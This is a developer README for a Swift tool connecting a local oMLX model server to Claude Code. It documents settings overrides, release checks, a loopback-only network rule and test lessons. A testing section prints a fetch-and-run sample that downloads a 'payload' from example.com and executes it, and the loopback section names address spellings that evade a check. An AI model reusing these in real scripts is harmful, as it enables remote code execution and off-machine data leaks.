# omlx-connector

One module connecting [oMLX](https://github.com/jundot/omlx) to Claude Code, with
two entry points: `omlx-claude` (the local model is the agent) and
`OmlxConnectorMCP` (Claude calls the local model as a tool).

## The distinction that organizes this repo

Two ways to combine Claude Code with a local model. They are easy to conflate, and
conflating them leads to reasoning about one from measurements of the other. The
axis is **who answers the user**.

| | **Usage 1** | **Usage 2** |
|---|---|---|
| Entry point | `omlx-claude` (`Sources/OmlxClaude/`) | `OmlxConnectorMCP` (`Sources/OmlxConnectorMCP/`) |
| Who answers | the local model | Claude |
| The local model is | the agent | a tool the agent calls |

**Both are the product.** They share `Sources/OmlxConnectorCore/`, one version, one
release, and one plugin install. Capability measured under one does not transfer to
the other: usage 1 requires the local model to plan its own tool use, usage 2 does
not.

Distribution is not symmetric, and the asymmetry is load-bearing rather than an
oversight: the `.mcpb` bundle carries the MCP server alone, because Claude Desktop
has no terminal for a command to be typed into. Say so wherever install is
described — someone who installs the bundle and cannot find `omlx-claude` will
otherwise conclude the install failed.

### `omlx-claude` is a layer, not a replacement

It **execs `omlx launch claude`**. oMLX's integration sets a dozen environment
variables carrying knowledge that keeps moving — tier mapping, the auto-compact
denominator, the LSP prefix-cache footgun, the telemetry trade-off. Reimplementing
any of that here forks it and then lets it rot. Changes to this command should keep
the exec at the end.

The settings override splits deliberately in two, and the split is the interesting
part. Keys we can determine independently are re-asserted through `--settings` (a
CLI argument, so it outranks the user's `settings.json` — that is the whole
mechanism against [#2715](https://github.com/jundot/omlx/issues/2715)). **It does not
outrank managed/MDM policy settings**, which sit above command-line arguments; on a
managed Mac #2715 is not worked around and the loopback gate will have verified an address
the session does not use. The managed files are read by `LaunchSettings.loadManagedSettings` and reported by
`managedConflicts`, **separately from every other scope** — merging them made the promise
unkeepable, because a merged key cannot be attributed and `ANTHROPIC_BASE_URL` is one we
normally win. Any text claiming `--settings` "outranks everything" is wrong; five such
claims had to be corrected at once, and the warning they described did not exist for a
further round after that.) Keys whose
values depend on which model oMLX ends up serving are **reported, not guessed**: see
`LaunchSettings.modelDependentKeys`. Moving one from the second list to the first
means reimplementing oMLX's model selection, which is the fork above.

There is now a third category, added by #11: keys we set **on the operator's behalf** —
defaults that are right because a local model is driving, which the operator can take back
explicitly. `disableAutoMode` is the first, with `OMLX_ALLOW_AUTO_MODE=1` as its opt-out.
This category is the one to be most careful with, because unlike the other two it changes
behaviour the operator did not ask about.

Adding it required widening the payload: `settingsJSON` emitted `["env": …]` and nothing
else, so a top-level settings key had nowhere to go. `LaunchSettings.settingsPayload` is
now the assembly point, and `env` is one member of it.

**A key in this third category needs its `managedConflicts` entry chosen by where it
actually lives.** `managedConflicts` filters `managedSettings["env"]`, so registering a
non-`env` key there produces a check that can never fire — coverage-shaped and inert, the
`CLAUDE_CODE_DISABLE_1M_CONTEXT` mistake one level down. `disableAutoMode` is read from the
managed file's top level *and* from `permissions.disableAutoMode`, because Claude Code
documents both spellings and a policy using the unwatched one would go unnamed.

The same trap sits in argv scanning: `ProbeTarget.value` resolves tokens through
`matchOption`, which only knows `omlxOptions`, so it returns nil for any Claude Code flag
under every input. `LaunchSettings.deliberateAutoModeRequested` scans separately and matches
exactly — Claude Code's parser takes no argparse-style prefixes, and inventing them would
report a flag nobody passed.

### What it actually works around, and what it only tracks

[#2715](https://github.com/jundot/omlx/issues/2715) **is** worked around, by the
`--settings` override. [#2716](https://github.com/jundot/omlx/issues/2716) **is not**:
the launch sets `CLAUDE_CODE_DISABLE_1M_CONTEXT`, which Claude Code honours only for
model ids it recognizes, and oMLX-served ids never are. The key is kept because it is
correct if one ever is, and inert otherwise — but **nothing may describe it as the
fix**. Claude Code prints its own warning saying so at startup. Tracked in issue #6.

That distinction was not free. The first cut of this command shipped the key with
README, help text and source comments all calling it the #2716 workaround, while the
end-to-end run that would have disproved it had already been done — the warning was in
the output and went unread. The mechanism was harmless; the claim was the defect.

### It keeps existing after upstream is fixed, and says so itself

Either issue being fixed does not retire this command — it also carries distribution,
the preflight, and a wider override than the launcher's own keys. But it must not
quietly keep asserting a workaround against a version nobody checked.

`UpstreamWorkaround.lastVerifiedOmlxVersion` is that mechanism. It records the oMLX
release the workaround was **read against**, and the command speaks up when the
installed one is newer. Deliberately not a "fixed in version X" constant: that
number does not exist while the bugs are open, and filling it in later is the act of
remembering this mechanism exists to remove.

**Bump it only after re-reading `integrations/claude.py` and `cli.py` in the
installed oMLX**, not merely after confirming a launch still works.

## Version consistency is enforced, and for a reason

`Sources/OmlxConnectorCore/Version.swift` is the single source of truth, shared by
both executables. Three files mirror it, and `scripts/build-release.sh` **fails the
build** if any disagrees:

- `plugin/.claude-plugin/plugin.json`
- `.claude-plugin/marketplace.json`
- `mcpb/manifest.json`

This is not tidiness. The plugin wrapper resolves the release tag from
`plugin.json`'s version, so a mismatch sends users to a tag whose asset does not
exist — and the failure surfaces as a download error pointing nowhere useful.

The same script also checks that `MCPIdentity.mcpServerName` equals the mcpb
manifest's `name`. **Claude Desktop silently drops a server on that mismatch** — no
error, the tools just never appear.

Both greps address files by path. Moving either one without updating the script
leaves a revision where the release build necessarily fails.

## Architecture

```
Sources/OmlxConnectorCore/          shared by both executables — keep it small
  Version.swift                     single source of truth for the version
  UpstreamWorkaround.swift          verified-baseline check + version ordering
  LoopbackPolicy.swift              the invariant, shared by every entry point

Sources/OmlxConnectorMCP/           usage 2 — Claude calls the local model
  main.swift                        flags, config resolution, startup guards
  Identity.swift                    binary name, MCP serverInfo.name, help text
  Server.swift                      tool definitions + handlers (dispatch is `internal`, tests assert coverage)
  OmlxClient.swift                  actor; single HTTP choke point; loopback enforcement
  ResponseFormatting.swift          formatJSON / error sanitization / TrustedErrorMessage

Sources/OmlxClaude/                 usage 1 — the local model is the agent
  main.swift                        preflight, staleness notice, exec into omlx launch
  LaunchSettings.swift              what the --settings override covers, and what it only reports
  ProbeTarget.swift                 address + credential resolution, loopback gate, argparse-compatible flag scan
  Help.swift                        command name + help text

plugin/bin/                         distribution — one download path, two callers
  fetch-release-binary.sh           resolve → download → verify → atomic install
  verify-download.sh                checksum + Developer ID requirement; refuses on either
  omlx-connector-wrapper.sh         MCP server entry: delegates, then execs
plugin/hooks/session-start.sh       usage-1 entry: delegates, then reports PATH state
```

**Neither caller downloads anything itself.** They pass a binary name to
`fetch-release-binary.sh` and that is all. This shape is not a preference — see
"one call site at a time" below.

**Core stays small on purpose.** It holds what more than one executable needs and
nothing else. Adding a type here means widening its access level for every caller,
and an earlier draft that moved `OmlxClient` and `ResponseFormatting` in would have
made twelve types public to serve one caller. Identity belonging to a single command
goes the other way, into that command's own target.

"Small" is not the same as "minimal", and the difference cost a regression. Keeping
`OmlxClient` out was right — twelve public types to serve one caller is a bad trade.
Keeping `LoopbackPolicy` out was wrong, and not because of where the line was drawn but
because of what it was drawn on: the test is **who depends on this**, not how big it is.
An invariant both commands are supposed to enforce belongs here no matter how few lines
it takes, and it went unnoticed precisely because it was small enough to look like it
did not qualify.

Conventions worth keeping:

- **Handlers return `String`**, never `CallTool.Result`. Keeps the tool logic
  testable without the MCP layer.
- **All HTTP goes through one `request()`** in `OmlxClient`. Error translation
  (notably connection-refused → an actionable message) lives there and nowhere else.
- **`formatJSON` pre-checks `isValidJSONObject`.** `JSONSerialization` raises an
  ObjC exception on a `Date`/NaN/non-string key, which Swift cannot catch — it takes
  down the process. The check is load-bearing.
- **`ProbeTarget` matches oMLX's argparse, not our idea of it.** Last occurrence wins,
  unambiguous prefixes count (`--ho` is `--host`), nothing past `--` is read. This is
  not politeness: the resolved address is written into `ANTHROPIC_BASE_URL`, so parsing
  a flag differently from oMLX means content leaving for a host oMLX is not serving. The
  full option set is listed in `omlxOptions` because prefix matching needs to know the
  options we *don't* care about too — otherwise `--ha` (haiku) looks like a prefix of
  `--host`.
- **`TrustedErrorMessage`** marks errors whose text we authored. Anything else
  (notably `URLError`) is sanitized before display; system-generated strings are not
  trusted into logs.

## The loopback constraint

`LoopbackPolicy` in `OmlxConnectorCore` refuses non-loopback hosts unless
`OMLX_ALLOW_REMOTE=1`. This is the one invariant that cannot regress: the entire
premise is that content stays on the machine. Tests cover it, including that the opt-in
accepts *only* `1` (so a stray `true` does not open the door).

**It requires the address in canonical form.** Two rounds got this wrong in two
different ways, and the second one is the instructive one.

`hasPrefix("127.")` was a text check, and RFC 1123 permits a DNS label to begin with a
digit — so `127.evil.example` is an ordinary registrable name that satisfied it, and
reviewers demonstrated it passing on both binaries.

The replacement parsed with `inet_pton`, and the doc here then claimed the whole class was
gone. **It was not.** BSD's `inet_pton` reads a leading-zero field as decimal while the
resolver and Claude Code's URL parser read it as octal, so `0127.13.37.42` passed as
127.13.37.42 and content went to 87.13.37.42. One spelling-sensitive parser for another —
and the preflight made it worse, because URLSession agrees with `inet_pton` and reported
success against the real local server on the way past.

So the check is now: parse, print back with `inet_ntop`, require equality. Any spelling
two parsers could read differently fails the round-trip, which is a property rather than a
list of examples. `::1` is compared by bytes, not text, because `0:0:0:0:0:0:0:1` is a
form people write and every parser agrees on — a strict text round-trip there would
reintroduce the over-strictness the old string equality had.

**Do not write "this removes the whole class" here again.** That sentence, added the round
before the octal defect was found, is what made the octal defect hard to see: a reader
checking whether spellings were handled found an assurance where a check should have been.

DNS is deliberately not consulted: resolving the name would make the answer depend on a
lookup that can differ between the check and the connection that follows. A name is not
this machine unless it is the literal `localhost`.

**Ambiguous is not the same as remote, and the messages must not merge them.**
`LoopbackPolicy.classify` returns `.loopback`, `.remote` or `.nonCanonical`, and
`OMLX_ALLOW_REMOTE=1` covers only the second. The opt-in means "this other machine is mine",
which nobody can assert about `0127.0.0.1` — they have not named one machine. Round 6 found
the earlier message reporting the ambiguous case as *non-loopback* and offering the opt-in
for it, so a user who followed the advice restored the octal bypass, with a green preflight
against the machine they meant. The refusal was right; its explanation and its remedy were
both wrong, which is worse than a plain refusal because it is a documented path back in.

**Every entry point must go through it.** `OmlxConfig.resolveBaseURL` does, for the MCP
server; `ProbeTarget.resolveChecked` does, for the launcher. Adding a third path that
resolves an address without consulting the policy reopens the hole described next.

### It was already regressed once, and how that happened is worth keeping

`omlx-claude` shipped without any loopback check. A grep for the policy over
`Sources/OmlxClaude/` returned one line — a comment *mentioning* it. Four independent
reviewers found this in a single pass; `OMLX_URL=https://external.example/api` resolved
cleanly and would have been asserted into `ANTHROPIC_BASE_URL`, which outranks
everything, taking the whole session and the bearer token with it.

Two things made it possible, and both are structural rather than careless:

1. **The policy lived in the MCP target.** A second entry point could not reach it
   without either moving it or copying it, and neither happened — so the invariant was
   enforced in the half of the module that had always had it.
2. **A fix for a different bug pinned the hole as correct.** An earlier round fixed
   `OMLX_URL` losing its scheme, and the regression test it added asserted that
   `https://server.example:8443/api` resolves. That is a true statement about URL
   assembly and a false statement about policy, and it was sitting in the suite reading
   like approval.

The lesson for future work here: a test that uses a remote address as a *fixture* must
opt in explicitly (`OMLX_ALLOW_REMOTE=1`), so that it cannot be mistaken for a statement
that remote addresses are acceptable. `ProbeTargetResolveTests` does this deliberately.

Any change touching address resolution should keep those tests passing without
weakening them.

## Build and release

```bash
make build / make test / make ping   # test = Swift suite + shell suites, both required
make install                      # MCP server, ad-hoc signed into ~/bin, dev only
make install-omlx-claude          # usage-1 command, same deal

export DEVELOPER_ID="<cert SHA-1>"
export NOTARY_PROFILE="<notarytool keychain profile>"
make release-signed               # build → sign → notarize → pack mcpb
```

arm64 only, deliberately: oMLX requires Apple silicon, so an x86_64 slice could
never reach a working server.

After `release-signed`, publish with the **six** assets it names — both bare
binaries, their `.sha256` files, the `.mcpb`, and that bundle's `.sha256`. The
script prints the exact command. Every one of those is matched downstream by exact
filename (`plugin/bin/omlx-connector-wrapper.sh` and `plugin/hooks/session-start.sh`
each look up their own), so an omission surfaces as a download error pointing
nowhere useful.

Both binaries go to Apple in one notarization submission: it notarizes every Mach-O
in the archive, so the second costs no extra round-trip.

## Testing notes

The suite is fast and hermetic — no network, no oMLX required. `StubClient` fakes
the `OmlxClienting` protocol. When adding a tool, add it to `defineTools()` and to
`executeToolCall`; `testEveryDeclaredToolDispatches` will catch the second if you
forget it.

`make test` also runs `scripts/tests/*.test.sh`. Those are not extras — the two things
they assert cannot be expressed in the Swift suite: that `verify-download.sh` refuses a
binary forging `TeamIdentifier` in `codesign` output, and that **no** script under
`plugin/` downloads or execs without going through the shared fetcher.

What the tests do *not* cover: anything requiring a live oMLX server. Verify those
by hand with `make ping` and a real tool call before releasing.

**Nor the wiring in `main.swift`**, which execs and so has no unit test. This is worth
stating rather than leaving implicit, because a mutation exposed it: deleting the two lines
that act on `LaunchSettings.managedBaseURLVerdict` — the ones that decline to launch into a
managed remote endpoint — leaves the whole suite green. The decision function is tested and
mutation-proven; its call site is not. That is the round-6 finding shape one level down, and
every guard added to `main.swift` inherits it. Check those by hand.

**Shrink what has to be checked by hand rather than only warning about it.** When the whole
product of a path through `main.swift` is *text* — a notice, a refusal, an explanation — the
text belongs in a testable type and `main.swift` keeps only the call. `managedConflictNotice`
moved for this reason (#11): its previous form was an inline string that ended with a
sentence about addresses, true only while every key it could name was an address or a
credential, and adding `disableAutoMode` to the list made it false without anything going
red. Message-shaped bugs are the ones this file's own history keeps producing — the mechanism
harmless, the claim the defect — and they are exactly what a string-returning function can be
made to fail on.

What is left in `main.swift` afterwards is a condition and a call, which is the smallest
thing a hand-check has to cover. The hand-check is still owed; it is just cheaper.

### Write the test so it can fail

Three consecutive review rounds here found fixes shipped with tests that could not fail
on the defect they were for. Each time the fixtures were drawn from the same mental
model as the code, so they could not disconfirm it:

- the IPv6 fix bracketed anything containing a colon; its two fixtures were `a b c` and
  `a|b`, both colon-free.
- the loopback fix matched `hasPrefix("127.")`; every near-miss fixture broke on the
  character right after `127` (`127x.`, `1270.`), so none put a legitimate dot there.

Run the new test against the old code and watch it fail *before* writing the fix. Two
mistakes in the round-3 fixes were caught this way and never shipped.

**A check that refuses everything passes every negative test.** The round-3 signature
requirement was briefly malformed — codesign read it as a path and rejected all input.
Eight "refuses X" cases stayed green; only the one positive case, "accepts a genuinely
signed binary", noticed. Any gate needs at least one test that it must *not* refuse.

**A skip is not a pass, and a test that constructs a fixture must assert it.** Round 4
found both, in the tests written for the rule above:

- that positive case *skipped* without `DEVELOPER_ID` and the suite still exited 0, so
  the one guard against "refuses everything" was silently absent in CI. Skips are now
  counted and printed, and `REQUIRE_FULL_SUITE=1` turns any skip into a failure. Set it
  on a release path.
- the forgery case discarded `codesign`'s exit status. Had codesign ever refused the
  embedded newline, the fixture would have been merely *unsigned*, refused for that
  instead, and the case would have printed `ok` forever while defending nothing. Building
  a fixture is part of the assertion: check that it succeeded, and that it has the
  property it exists to have.

### Fix the property, not the file

Round 2 rated an unverified download CRITICAL. It was fixed in the file the report
named, and round 3 found the sibling downloader in the same plugin — same release, other
binary — still doing every one of the same things.

`scripts/tests/no-unverified-download.test.sh` asserts the property instead — and took
**three** attempts to actually do it, which is the more useful lesson than the eventual
shape.

Version 3 is an allowlist over **repo-relative paths**, plus a directory of adversarial
fixtures the scanner must refuse. Both halves were necessary and neither was obvious:

- **The allowlist must be over files, not spellings.** Version 2 called itself an
  allowlist while being three denylists — a `*.sh` glob, a mechanism regex, a path regex.
  A reviewer defeated it with a downloader in `plugin/hooks/` that had no `.sh` suffix, so
  `find` never enumerated it; `hooks.json` accepts any executable path, so that is a real
  surface. It reported 6 passed / 0 failed with a verbatim copy of the round-2 CRITICAL
  sitting in the shipped directory. Version 2 also authorized by **basename**, so any file
  named `fetch-release-binary.sh` anywhere under `plugin/` inherited the download
  privilege, and its "must call the verifier" check was a `grep` that a comment satisfied
  — round 2's original defect, reproduced inside the check written to prevent it.
- **The scanner needs cases that must fail.** Versions 1 and 2 had none: they only asserted
  that the compliant files were compliant, so blanking a pattern left them green. Round 4
  had already recorded the dual of this — a check that refuses everything passes every
  negative test — and the dual was not applied. `scripts/tests/fixtures/` now holds four
  downloaders, each of which a previous version reported clean, and each must be refused.
  Verified by deleting the allowlist clause: all four go red.

**Adding a fixture is how you extend that test.** Do not add a clause without one, and do
not delete a fixture because it now passes.

The rest of this section is the earlier version's account, kept because the failure is
instructive:

It enumerated what a violation looks like: grep for `curl`, grep for `chmod +x`. A
reviewer said that matched spellings rather than the property. Trying to break it took one
attempt:

```bash
python3 -c "…urlretrieve…" https://example.com/payload "$HOME/bin/evil3"
chmod 755 "$HOME/bin/evil3"
"$HOME/bin/evil3" "$@"
```

No `curl`, no `chmod +x`, no `exec "$BINARY"` — three clauses, all walked around, doing
exactly the thing the CRITICAL was filed about. The scanner reported **3 passed, 0
failed**.

So it is an allowlist now: exactly one file may fetch, exactly one may verify, and every
other script under `plugin/` must be free of network access and of running anything out of
the install directory. **Enumerate what is permitted, not what is forbidden** — a list of
violations can always be walked around, a list of permitted files cannot. The maintenance
cost is that a new fetch mechanism has to be added to the pattern; that cost is the right
one, because the alternative is a scanner that silently stops covering whatever gets
invented next.
